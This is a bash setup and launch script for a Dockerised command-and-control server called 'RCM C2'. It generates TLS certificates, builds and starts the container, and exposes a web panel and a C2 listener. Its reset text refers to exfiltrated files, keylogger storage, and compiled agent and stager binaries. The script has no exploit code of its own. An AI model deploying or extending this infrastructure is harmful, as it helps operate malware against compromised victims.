#!/usr/bin/env bash
# start_docker.sh — Full RCM stack setup and launch
# Generates certs, fixes permissions, and starts the server in one shot.
#
# Usage:
#   ./start_docker.sh           — normal start
#   ./start_docker.sh --reset   — wipe all persistent data, then start fresh
set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; CLR_RESET='\033[0m'

info()    { echo -e "${CYAN}[*]${CLR_RESET} $*"; }
success() { echo -e "${GREEN}[+]${CLR_RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${CLR_RESET} $*"; }
die()     { echo -e "${RED}[-] ERROR:${CLR_RESET} $*" >&2; exit 1; }
must_sudo() { sudo "$@"; }

# ── Sanity checks ─────────────────────────────────────────────────────
command -v docker >/dev/null 2>&1 || die "docker not found. Install Docker first."
docker compose version >/dev/null 2>&1 || die "docker compose plugin not found."

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

[[ -f Dockerfile ]]         || die "Dockerfile not found. Run this script from the project root."
[[ -f docker-compose.yml ]] || die "docker-compose.yml not found."
[[ -f gen_certs.sh ]]       || die "gen_certs.sh not found. It must be in the same directory as this script."

sudo -v || die "sudo authentication failed. Re-run with a user that has sudo access."

# ── Parse flags ────────────────────────────────────────────────────────
DO_RESET=false
for arg in "$@"; do
    case "$arg" in
        --reset) DO_RESET=true ;;
    esac
done

# ── Step 0 (optional): Reset all persistent data ──────────────────────
if $DO_RESET; then
    echo ""
    echo -e "${RED}${BOLD}  !! RESET MODE !!${CLR_RESET}"
    echo -e "${YELLOW}  This will permanently delete:${CLR_RESET}"
    echo "    • c2_audit.db        (all sessions, operators, build keys, listeners, audit log)"
    echo "    • certs/             (TLS certificates — will be regenerated)"
    echo "    • downloads/         (all exfiltrated files)"
    echo "    • data/              (keylogger storage)"
    echo "    • logs/              (server logs)"
    echo "    • dist/              (compiled agent binaries and server_keys.json)"
    echo "    • history.txt        (CLI command history)"
    echo ""
    read -r -p "  Are you sure? [y/N] " confirm
    case "$confirm" in
        [yY][eE][sS]|[yY]) ;;
        *) echo "Aborted."; exit 0 ;;
    esac
    echo ""

    if docker compose ps rcm-server 2>/dev/null | grep -q "running"; then
        info "Stopping running container before reset..."
        docker compose down
        success "Container stopped."
    fi

    info "Deleting persistent data..."

    must_sudo rm -rf c2_audit.db
    touch c2_audit.db
    success "Reset c2_audit.db"

    must_sudo rm -rf certs/
    mkdir -p certs
    success "Deleted certs/"

    must_sudo rm -rf downloads/ data/ logs/
    mkdir -p downloads data logs
    success "Deleted downloads/, data/, logs/"

    must_sudo rm -f dist/*.exe dist/exe_* dist/dll_* dist/service_* dist/stager_* \
          dist/server_keys.json 2>/dev/null || true
    success "Deleted dist/ artifacts"

    rm -f history.txt
    success "Deleted history.txt"

    echo ""
    success "Reset complete. The server will create a fresh admin account on first start."
    echo ""
fi

# ── Step 1: Create host directories and required files ─────────────────
info "Creating runtime directories..."
mkdir -p certs logs downloads data modules extensions dist

if [[ -d c2_audit.db ]]; then
    warn "c2_audit.db is a directory — fixing..."
    must_sudo rm -rf c2_audit.db
fi
[[ -f c2_audit.db ]] || touch c2_audit.db

# ── Step 2: Generate TLS certificates ─────────────────────────────────
NEED_CERTS=false
for f in certs/ca.crt certs/server.crt certs/server.key.der \
          certs/client.crt certs/client.key.der; do
    [[ ! -s "$f" ]] && { NEED_CERTS=true; break; }
done

if $NEED_CERTS; then
    info "Generating TLS certificates via gen_certs.sh..."
    bash "$SCRIPT_DIR/gen_certs.sh" "$SCRIPT_DIR/certs"
    success "Certificates generated."
else
    info "Certificates already present — skipping generation."
    info "Run with --reset to regenerate if you changed the server IP."
fi

# ── Step 3: Fix ownership ──────────────────────────────────────────────
info "Setting ownership to uid 1000 (sudo required)..."
must_sudo chown -R 1000:1000 \
    certs logs downloads data modules extensions dist c2_audit.db
must_sudo chmod 755 certs logs downloads data modules extensions dist
must_sudo chmod 644 certs/*.crt certs/*.csr 2>/dev/null || true
must_sudo chmod 600 certs/*.key certs/*.der  2>/dev/null || true
must_sudo chmod 644 c2_audit.db
success "Ownership set."

# ── Step 4: Build image ───────────────────────────────────────────────
info "Building Docker image (first build: 10-20 min compiling Rust)..."
docker compose build --no-cache rcm-server
success "Image built."

# ── Step 5: Start the server ──────────────────────────────────────────
info "Starting rcm-server..."
docker compose up -d rcm-server
success "Container started."

# ── Step 6: Wait for server to initialise ─────────────────────────────
info "Waiting for server to initialise (up to 60s)..."
READY=false
for i in $(seq 1 60); do
    if docker compose logs rcm-server 2>/dev/null | grep -q "API Endpoint"; then
        READY=true
        break
    fi
    sleep 1
done

if ! $READY; then
    echo ""
    warn "Server did not report ready within 60s. Last 20 log lines:"
    docker compose logs --tail=20 rcm-server 2>/dev/null | sed 's/^/  /'
    echo ""
    die "Server failed to start — see logs above."
fi

# ── Step 7: Print summary ─────────────────────────────────────────────
echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${CLR_RESET}"
echo -e "${GREEN}${BOLD}  RCM C2 Server is up${CLR_RESET}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${CLR_RESET}"
echo ""
echo -e "  ${CYAN}Web Panel${CLR_RESET}   →  http://127.0.0.1:8080"
echo -e "  ${CYAN}C2 Listener${CLR_RESET} →  tls://0.0.0.0:4443"
echo ""

echo -e "${YELLOW}${BOLD}  Server startup log:${CLR_RESET}"
docker compose logs rcm-server 2>/dev/null \
    | grep -v "^$" \
    | sed 's/^rcm-server  | //' \
    | sed 's/^/  /'
echo ""

echo -e "  ${CYAN}Follow logs${CLR_RESET}  →  docker compose logs -f rcm-server"
echo -e "  ${CYAN}Stop${CLR_RESET}         →  docker compose down"
echo -e "  ${CYAN}Full reset${CLR_RESET}   →  $0 --reset"
echo -e ""
echo -e "  ${YELLOW}NOTE:${CLR_RESET} If you add a new network interface or change the server IP,"
echo -e "  run ${CYAN}$0 --reset${CLR_RESET} to regenerate certs with the new IP in the SAN."
echo ""
